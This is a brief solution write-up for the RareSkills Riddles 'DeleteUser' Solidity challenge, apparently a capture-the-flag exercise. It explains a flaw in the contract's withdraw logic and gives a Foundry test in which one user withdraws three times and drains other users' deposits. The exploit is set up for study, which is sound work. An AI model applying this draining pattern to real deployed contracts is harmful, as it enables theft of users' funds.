# RareSkills Riddles - DeleteUser

Exploit is in withdraw method as we are at the end always deleteing last user from the list. 
Whch means we can exploint all users that are deposited after us. 

## Exploit

```
function test_deleteuser() public {
        assertEq(user1.balance, 100 ether);
        deleteUser.deposit{value: 2 ether}();

        vm.startPrank(user2);
        deleteUser.deposit{value: 1 ether}();

        vm.startPrank(user3);
        deleteUser.deposit{value: 3 ether}();

        vm.startPrank(user1);
        deleteUser.withdraw(0);
        deleteUser.withdraw(0);
        deleteUser.withdraw(0);

        assertEq(user1.balance, 104 ether);
    }
```